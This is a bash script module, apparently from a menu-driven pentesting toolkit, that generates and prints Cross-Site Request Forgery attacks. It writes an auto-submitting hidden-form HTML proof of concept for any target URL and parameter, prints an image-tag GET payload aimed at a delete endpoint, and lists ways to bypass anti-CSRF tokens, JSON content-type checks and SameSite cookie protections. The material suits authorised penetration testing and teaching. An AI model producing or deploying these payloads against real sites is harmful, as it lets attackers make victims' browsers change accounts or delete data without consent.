#!/bin/bash
# HackTricks Ref: csrf-cross-site-request-forgery.md
# Module: CSRF (Cross-Site Request Forgery)

echo -e "${C6}[WEB ATTACK: CSRF]${NC}"
echo -e "Reference: https://book.hacktricks.xyz/pentesting-web/csrf-cross-site-request-forgery"
echo -e "--------------------------------------------------"

echo -e "${C4}Select CSRF Attack Vector:${NC}"
echo "1) HTML Form Auto-Submit PoC (POST)"
echo "2) GET-based CSRF (Image/Link)"
echo "3) Bypass Anti-CSRF Token (Removal/Matching)"
echo "4) JSON-based CSRF (Flash/307 Redirect)"
echo "5) SameSite Cookie Bypass Theory"
echo "0) Exit"

read -p "Selection: " csrf_opt

case $csrf_opt in
    1)
        echo -e "\n${C2}[*] Generating POST CSRF PoC:${NC}"
        read -p "Target Action URL: " target
        read -p "Parameter Name (e.g. email): " param
        read -p "Parameter Value: " value
        
        cat <<EOF > csrf_poc.html
<html>
  <body>
    <script>history.pushState('', '', '/')</script>
    <form action="$target" method="POST">
      <input type="hidden" name="$param" value="$value" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
EOF
        echo -e "${C2}[+] PoC saved to csrf_poc.html${NC}"
        ;;
    2)
        echo -e "\n${C2}[*] GET CSRF:${NC}"
        echo "Simple payload via image tag:"
        echo " <img src=\"https://target.com/api/delete?id=10\">"
        echo "The browser will automatically fetch the URL when the victim views the page."
        ;;
    3)
        echo -e "\n${C2}[*] Token Bypass Techniques:${NC}"
        echo "1. Remove the token parameter entirely."
        echo "2. Submit a blank token."
        echo "3. Change POST to GET (sometimes tokens are only checked on POST)."
        echo "4. Use your own token (if the server only checks if the token exists, not if it's tied to the user)."
        ;;
    4)
        echo -e "\n${C2}[*] JSON CSRF (Complex):${NC}"
        echo "If the server expects Content-Type: application/json:"
        echo "1. Try sending as application/x-www-form-urlencoded with a trailing '='."
        echo "   Payload: {\"a\":\"b\"} -> Result: {\"a\":\"b\"}="
        echo "2. Use an <embed> tag with a Flash file (legacy)."
        ;;
    5)
        echo -e "\n${C2}[*] SameSite Bypass:${NC}"
        echo " - SameSite=Lax: Allows GET requests from top-level navigation (links)."
        echo " - SameSite=None: Full CSRF possible if 'Secure' flag is set."
        echo " - Bypass via Top-Level Navigation: Use window.location to trigger a GET-based action."
        ;;
    *) return ;;
esac

echo -e "\n--------------------------------------------------"
read -p "Press Enter to return..."
